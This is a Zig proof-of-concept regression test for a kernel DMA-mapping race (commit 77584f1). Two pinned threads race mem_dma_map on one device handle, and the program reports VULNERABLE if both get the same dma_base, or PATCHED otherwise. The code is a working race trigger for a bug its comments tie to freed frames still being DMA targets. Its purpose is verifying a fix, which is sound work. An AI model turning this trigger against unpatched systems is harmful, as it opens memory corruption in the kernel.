// PoC for 77584f1: per-device DMA mapping cursor race.
//
// Pre-patch: arch.mapDmaPages reads `device.detail.pci.dma_cursor`,
// walks/installs leaf PTEs for each shm page, then writes the bumped
// cursor back — with no synchronization. Two threads in a process
// that share a device cap with the `dma` right can race the
// read-modify-write: both read the same starting cursor, both install
// PTEs at the same IOVA range, and both return the SAME `dma_base`
// for two DIFFERENT shared-memory objects. A subsequent unmap then
// tears down PTEs still backing the loser SHM (and pmm-frees frames
// the device is still programmed to DMA into).
//
// Post-patch: a per-device `Pci.dma_lock` SpinLock serializes the
// entire cursor-read / PTE-walk / cursor-write / IOTLB-flush region
// in both `mapDmaPages` and `unmapDmaPages`. Two concurrent mappers
// see distinct cursor values and never collide.
//
// Detection (deterministic given a single race firing):
//
//   * Each trial, both threads concurrently call `mem_dma_map` on
//     their OWN shared-memory object using the SAME device handle.
//   * They synchronize on a per-trial barrier so the map syscalls
//     enter the kernel as close in time as possible.
//   * The two returned `dma_base` values are compared — under the
//     patch the cursor advances under the lock and the two bases
//     can never collide; without the patch, a single overlapping
//     read-modify-write of the cursor produces identical bases for
//     two different SHMs.
//   * After comparing, both threads `mem_dma_unmap` so the per-process
//     mapping table doesn't fill up before the next trial.
//
// We run a small number of trials to maximise the probability of
// at least one race firing in the unpatched kernel; one collision
// is sufficient and conclusive. The detection itself never produces
// a false VULNERABLE on the patched kernel.
//
// Differential: pre-patch prints `POC-77584f1: VULNERABLE`, post-patch
// prints `POC-77584f1: PATCHED`.

const lib = @import("lib");

const perm_view = lib.perm_view;
const perms = lib.perms;
const syscall = lib.syscall;
const t = lib.testing;

// Each trial maps + unmaps 2 SHMs (one per thread). With a wide
// SHM (many pages) the per-call PTE-walk window inside the kernel
// is long enough that two threads pinned to different cores will
// reliably overlap pre-patch within a handful of trials.
const TRIALS: usize = 12;
const SHM_PAGES: usize = 8;
const SHM_BYTES: u64 = SHM_PAGES * 0x1000;

const SHM_RIGHTS: u64 = (perms.SharedMemoryRights{ .read = true, .write = true }).bits();

// Shared state. Reset each trial.
var g_dev_handle: u64 = 0;
var g_worker_shm: u64 = 0;
var g_trial_idx: u64 align(8) = 0;
// Two-phase rendezvous counters, reset per trial. Each thread bumps
// its own slot to 1 and waits for the other to do the same. Doing
// it this way avoids the monotonic-counter pitfall where one thread
// races past the next trial's barrier because the underlying counter
// hasn't been reset.
var g_rendezvous_main_in: u64 align(8) = 0;
var g_rendezvous_worker_in: u64 align(8) = 0;
var g_rendezvous_main_out: u64 align(8) = 0;
var g_rendezvous_worker_out: u64 align(8) = 0;
var g_main_base: u64 align(8) = 0;
var g_worker_base: u64 align(8) = 0;
var g_collide_at: i64 = -1;
var g_worker_done: u64 align(8) = 0;
var g_kill_worker: u64 align(8) = 0;

fn rendezvousIn(my: *u64, peer: *const u64) void {
    @atomicStore(u64, my, 1, .seq_cst);
    while (@atomicLoad(u64, peer, .seq_cst) == 0) {
        // tight spin
    }
}

fn rendezvousReset(a: *u64, b: *u64) void {
    @atomicStore(u64, a, 0, .seq_cst);
    @atomicStore(u64, b, 0, .seq_cst);
}

fn workerLoop() void {
    _ = syscall.set_affinity(0xE); // cores 1-3
    const shm = g_worker_shm;
    var trial: usize = 0;
    while (trial < TRIALS) {
        if (@atomicLoad(u64, &g_kill_worker, .seq_cst) != 0) break;

        // Wait for main to start the trial.
        while (@atomicLoad(u64, &g_trial_idx, .seq_cst) <= trial) {
            // tight spin
        }

        // Phase 1: in-rendezvous — both threads ready to enter the
        // race region.
        rendezvousIn(&g_rendezvous_worker_in, &g_rendezvous_main_in);

        const ret = syscall.mem_dma_map(g_dev_handle, shm);
        if (ret > 0) {
            @atomicStore(u64, &g_worker_base, @bitCast(ret), .seq_cst);
        }

        // Phase 2: out-rendezvous — both threads done with the map
        // syscall and ready for main to compare + unmap.
        rendezvousIn(&g_rendezvous_worker_out, &g_rendezvous_main_out);

        trial += 1;
    }
    @atomicStore(u64, &g_worker_done, 1, .seq_cst);
    syscall.thread_exit();
}

pub fn main(pv: u64) void {
    const view: [*]const perm_view.UserViewEntry = @ptrFromInt(pv);
    const dev = t.requireMmioDevice(view, "POC-77584f1");
    g_dev_handle = dev.handle;


    // Two SHMs reused across trials, one per thread. 1 page each
    // keeps the per-trial PTE work small.
    const main_shm_h = syscall.shm_create_with_rights(SHM_BYTES, SHM_RIGHTS);
    if (main_shm_h <= 0) {
        syscall.write("POC-77584f1: UNEXPECTED main shm_create\n");
        syscall.shutdown();
    }
    const worker_shm_h = syscall.shm_create_with_rights(SHM_BYTES, SHM_RIGHTS);
    if (worker_shm_h <= 0) {
        syscall.write("POC-77584f1: UNEXPECTED worker shm_create\n");
        syscall.shutdown();
    }
    const main_shm: u64 = @bitCast(main_shm_h);
    g_worker_shm = @bitCast(worker_shm_h);

    const wh = syscall.thread_create(&workerLoop, 0, 4);
    if (wh <= 0) {
        syscall.write("POC-77584f1: UNEXPECTED thread_create\n");
        syscall.shutdown();
    }
    _ = syscall.set_affinity(0x1); // core 0

    var trial: usize = 0;
    while (trial < TRIALS) {
        @atomicStore(u64, &g_main_base, 0, .seq_cst);
        @atomicStore(u64, &g_worker_base, 0, .seq_cst);
        rendezvousReset(&g_rendezvous_main_in, &g_rendezvous_worker_in);
        rendezvousReset(&g_rendezvous_main_out, &g_rendezvous_worker_out);

        // Open the gate for this trial — worker is spinning on this.
        @atomicStore(u64, &g_trial_idx, @as(u64, trial + 1), .seq_cst);

        rendezvousIn(&g_rendezvous_main_in, &g_rendezvous_worker_in);

        const ret = syscall.mem_dma_map(g_dev_handle, main_shm);
        if (ret > 0) {
            @atomicStore(u64, &g_main_base, @bitCast(ret), .seq_cst);
        }

        rendezvousIn(&g_rendezvous_main_out, &g_rendezvous_worker_out);

        const mb = @atomicLoad(u64, &g_main_base, .seq_cst);
        const wb = @atomicLoad(u64, &g_worker_base, .seq_cst);
        if (mb != 0 and wb != 0 and mb == wb) {
            g_collide_at = @intCast(trial);
            @atomicStore(u64, &g_kill_worker, 1, .seq_cst);
        }

        // Drain mappings so the per-process DMA table doesn't fill up.
        if (mb != 0) _ = syscall.mem_dma_unmap(g_dev_handle, main_shm);
        if (wb != 0) _ = syscall.mem_dma_unmap(g_dev_handle, g_worker_shm);

        if (g_collide_at >= 0) break;
        trial += 1;
    }

    // Make sure the worker can wake from its trial-gate spin so it
    // observes g_kill_worker (set above when we broke out).
    @atomicStore(u64, &g_kill_worker, 1, .seq_cst);
    @atomicStore(u64, &g_trial_idx, @as(u64, TRIALS + 2), .seq_cst);
    // Drop the rendezvous gates so any blocked worker passes.
    @atomicStore(u64, &g_rendezvous_main_in, 1, .seq_cst);
    @atomicStore(u64, &g_rendezvous_main_out, 1, .seq_cst);

    while (@atomicLoad(u64, &g_worker_done, .seq_cst) == 0) {
        syscall.thread_yield();
    }

    if (g_collide_at >= 0) {
        syscall.write("POC-77584f1: VULNERABLE (dma_base collision in trial ");
        t.printDec(@bitCast(g_collide_at));
        syscall.write(")\n");
    } else {
        syscall.write("POC-77584f1: PATCHED (no dma_base collision across ");
        t.printDec(TRIALS);
        syscall.write(" trials)\n");
    }
    syscall.shutdown();
}
